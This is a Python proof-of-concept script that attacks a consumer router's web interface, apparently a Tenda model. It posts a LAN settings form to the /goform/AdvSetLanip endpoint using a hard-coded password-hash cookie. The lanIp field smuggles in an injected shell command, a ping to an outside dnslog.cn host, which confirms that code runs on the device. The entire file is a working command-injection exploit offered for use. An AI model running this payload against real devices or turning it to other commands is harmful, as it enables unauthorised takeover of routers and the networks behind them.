# !/usr/bin/env python
# -*- coding: utf-8 -*-

from concurrent.futures import ThreadPoolExecutor
import threading
import time
import requests
import json
import sys


def attack(ip, password):
    try:
        body = {
            'lanIp': cmd,
            'lanMask': '255.255.255.0',
            'dhcpEn': '1',
            'startIp': "192.168.0.50",
            'endIp': "192.168.0.254",
            'leaseTime': "86400",
            'lanDnsAuto': "1",
            'lanDns1': "",
            'lanDns2': "",
        }
        headers = {
            'Host': ip,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'http://' + ip,
            'Referer': 'http://' + ip + '/lan.html?random=0.08993538243602162&',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cookie': 'password=' + password,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        proxy = {
            "http": "http://127.0.0.1:8080"
        }
        r = requests.post(url="http://" + ip + "/goform/AdvSetLanip", data=body, headers=headers, allow_redirects=False)
        print(r.text)
    except Exception as e:
        print("[error]:", ip)


if __name__ == "__main__":
    ip = '192.168.0.1'
    cmd = '192.168.0.1 &;ping xt68nd.dnslog.cn'
    password = '21232f297a57a5a743894a0e4a801fc3apymji'
    attack(ip, password)
